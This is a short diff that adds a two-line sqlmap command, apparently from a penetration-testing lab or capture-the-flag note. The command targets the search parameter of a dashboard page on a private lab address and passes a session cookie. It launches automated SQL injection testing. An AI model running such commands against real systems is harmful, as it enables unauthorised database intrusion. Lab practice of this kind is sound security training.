@@ -1,0 +1,2 @@
+sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --
+cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"
